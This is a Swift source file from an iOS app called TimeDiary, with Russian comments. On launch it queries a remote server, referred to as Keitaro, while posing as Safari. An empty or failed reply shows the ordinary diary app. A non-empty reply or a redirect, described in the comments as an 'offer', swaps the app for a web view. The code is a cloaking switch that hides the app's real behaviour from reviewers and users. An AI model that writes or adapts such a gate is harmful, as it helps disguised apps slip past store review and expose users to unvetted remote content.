//  ServerCheckView.swift
//  TimeDiary

import SwiftUI

struct ServerCheckView: View {
    @State var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    @ObservedObject var coordinator: AppCoordinator
    
    var body: some View {
        ZStack {
            if isFetched == false {
                ProgressView()
            } else if isFetched == true {
                if isBlock == true {
                    // Если сервер заблокирован, показываем основное приложение
                    Group {
                        if coordinator.showOnboarding {
                            OnboardingContainerView(coordinator: coordinator)
                        } else {
                            MainTabView(selectedTab: $coordinator.selectedTab)
                        }
                    }
                } else if isBlock == false {
                    WebSystemView()
                }
            }
        }
        .onAppear {
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    // Нет HTTP ответа - блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
        }.resume()
    }
}
